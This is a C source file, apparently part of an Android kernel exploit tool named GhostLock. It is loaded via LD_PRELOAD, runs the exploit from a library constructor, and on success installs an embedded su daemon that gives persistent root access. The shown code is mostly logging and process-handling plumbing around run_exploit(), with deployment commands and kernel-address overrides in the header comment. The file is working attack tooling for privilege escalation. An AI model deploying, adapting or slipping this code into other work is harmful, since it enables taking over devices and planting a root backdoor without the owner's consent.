/* GhostLock — LD_PRELOAD entry point.
 *
 *     LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true
 *
 * Runs the exploit from a library constructor and, on success, installs the
 * embedded su daemon — warhol-root's route, see su_install.c. One file pushed:
 * the su binary rides along inside this .so as a blob (su_blob.S) rather than
 * being a second thing to push.
 *
 * This is deliberately *not* the full ghostlock flow: no root script, no ksud,
 * no KernelSU, no adb bootstrap. Those stay in ghostlock-oneplus.
 *
 * It is the same code path as the binary, not a reimplementation: it calls
 * run_exploit(), so a pass here means the exploit works, not that a lookalike
 * did.
 *
 * Output goes to stdout *and* to a log file, because the interesting failures
 * are the ones where the device reboots and the terminal scrollback is all you
 * would otherwise have. Override the path with GHOSTLOCK_LOG.
 *
 * Environment:
 *   GHOSTLOCK_LOG=<path>          log file (default /data/local/tmp/.ghostlock.log)
 *   GHOSTLOCK_PHYS_LOAD=0x...     override the compiled-in kernel load address
 *   PSELECT_SHIFT=<n>             override the compile-time stack overlay shift
 */

#include "common.h"
#include <poll.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <time.h>

#define LOG_DEFAULT "/data/local/tmp/.ghostlock.log"
#define GUARD_ENV "GHOSTLOCK_PRELOAD_ACTIVE"

extern int run_exploit(int argc, char **argv);

static int tee_console = -1;
static int tee_log = -1;
static int tee_pipe[2] = {-1, -1};
static pthread_t tee_thread;
static pid_t tee_owner_pid = 0;
static volatile int tee_started = 0;
static volatile int tee_stop = 0;
static volatile int tee_finished = 0;
static volatile int verdict_printed = 0;

/* NOT getpid(). bionic caches the pid in pthread_internal_t, and util.c's
 * clone_child()/clone_leak_child() create children with a raw
 * syscall(SYS_clone, ...) rather than fork(), which leaves that cache holding
 * the parent's pid -- so getpid() in those children lies. The raw syscall is
 * the only reading that survives them. */
static pid_t real_pid(void) { return (pid_t)syscall(SYS_getpid); }

static void write_all(int fd, const char *p, size_t n) {
  while (n) {
    ssize_t w = write(fd, p, n);
    if (w < 0) {
      if (errno == EINTR) continue;
      return;
    }
    if (w == 0) return;
    p += w;
    n -= (size_t)w;
  }
}

/* Drains the pipe to both sinks. Exits on `tee_stop` plus an idle poll rather
 * than on EOF: the exploit forks, so a child can be holding the write end open
 * long after the parent is done, and waiting for EOF would hang the join. */
static void *tee_main(void *arg) {
  (void)arg;
  char buf[4096];
  for (;;) {
    struct pollfd pfd = { .fd = tee_pipe[0], .events = POLLIN };
    int r = poll(&pfd, 1, 200);
    if (r < 0) {
      if (errno == EINTR) continue;
      break;
    }
    if (r == 0) {
      if (tee_stop) break;
      continue;
    }
    ssize_t n = read(tee_pipe[0], buf, sizeof(buf));
    if (n < 0) {
      if (errno == EINTR) continue;
      break;
    }
    if (n == 0) break;
    if (tee_console >= 0) write_all(tee_console, buf, (size_t)n);
    if (tee_log >= 0) write_all(tee_log, buf, (size_t)n);
  }
  return NULL;
}

static void tee_begin(void) {
  const char *path = getenv("GHOSTLOCK_LOG");
  if (!path || !*path) path = LOG_DEFAULT;

  tee_log = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  tee_console = dup(STDOUT_FILENO);
  if (tee_log < 0 && tee_console < 0) return;
  if (pipe(tee_pipe) < 0) return;

  if (tee_log >= 0) {
    char hdr[256];
    time_t now = time(NULL);
    int n = snprintf(hdr, sizeof(hdr),
                     "== ghostlock preload %s == pid=%d uid=%d epoch=%lld\n",
                     BUILD_VARIANT_LABEL, getpid(), (int)getuid(),
                     (long long)now);
    if (n > 0) write_all(tee_log, hdr, (size_t)n);
  }

  tee_owner_pid = real_pid();
  if (pthread_create(&tee_thread, NULL, tee_main, NULL) != 0) {
    close(tee_pipe[0]);
    close(tee_pipe[1]);
    tee_pipe[0] = tee_pipe[1] = -1;
    return;
  }
  tee_started = 1;
  dup2(tee_pipe[1], STDOUT_FILENO);
  /* run_exploit() does this too, but not until after the constructor has
   * already printed. stdout is a pipe here, so the default is fully buffered,
   * and the exploit forks -- a child would inherit the unflushed buffer and
   * re-emit it on exit, duplicating lines in the log. Settle it up front. */
  setvbuf(stdout, NULL, _IONBF, 0);
}

/* Idempotent, and registered with atexit() as well as called directly: pr_error
 * ends in exit(-1), so the log has to survive a path that never returns here. */
static void tee_end(void) {
  /* atexit handlers are inherited across fork/clone, and the exploit's children
   * exit() rather than _exit(): clone_leak_child() ends in exit(0), and
   * pr_error() (reached in children when e.g. perf_event_open fails) ends in
   * exit(-1). Without this guard such a child runs the whole teardown below --
   * observed on PMG110 as the leak child printing the ABORTED verdict and then
   * hanging in pthread_join() on a thread that does not exist in it, which
   * hangs the parent in turn on its waitpid(child_leak). Only the process that
   * started the tee may end it. */
  if (tee_owner_pid && real_pid() != tee_owner_pid) return;
  if (tee_finished) return;
  tee_finished = 1;
  /* Every failure exit in run_exploit() goes through pr_error(), which never
   * returns, so the constructor's verdict line would be missing precisely when
   * it is wanted. Emit one here instead of letting the log just stop. */
  if (!verdict_printed)
    printf("[!] ghostlock preload verdict: ABORTED -- see the last [!] line\n");
  fflush(stdout);
  if (!tee_started) return;
  tee_stop = 1;
  if (tee_console >= 0) dup2(tee_console, STDOUT_FILENO);
  close(tee_pipe[1]);
  tee_pipe[1] = -1;
  pthread_join(tee_thread, NULL);
  if (tee_log >= 0) close(tee_log);
}

__attribute__((constructor)) static void ghostlock_preload_init(void) {
  /* LD_PRELOAD is inherited across exec, and a stray re-entry would run the
   * exploit twice against the same kernel. Make that impossible explicitly
   * rather than relying on nothing happening to exec. */
  if (getenv(GUARD_ENV)) return;
  setenv(GUARD_ENV, "1", 1);

  /* As warhol-root's constructor does. The linker has already mapped us, so
   * this only affects what children inherit -- and the su route has children
   * that outlive the run: the daemon is started with execl() and then serves
   * every `su -c` shell after it. Leaving LD_PRELOAD set would put this .so
   * into all of them, permanently, and break them the moment the file is
   * deleted. The guard above stops re-entry; this stops the inheritance. */
  unsetenv("LD_PRELOAD");

  tee_begin();
  atexit(tee_end);

  int rc = 1;
  if (p0_phys_load_init() == 0) rc = run_exploit(0, NULL);

  /* Three outcomes, not two. rc==2 is "the exploit landed, the su install did
   * not" -- printing EXPLOIT FAILED there would contradict the line run_exploit
   * just emitted, and would send anyone reading the log off to debug offsets
   * when the offsets were fine. */
  printf("%s ghostlock preload verdict: %s\n",
         rc == 0 ? "[+]" : rc == 2 ? "[-]" : "[!]",
         rc == 0   ? "EXPLOIT OK"
         : rc == 2 ? "EXPLOIT OK, SU INSTALL FAILED"
                   : "EXPLOIT FAILED");
  verdict_printed = 1;
  tee_end();
}
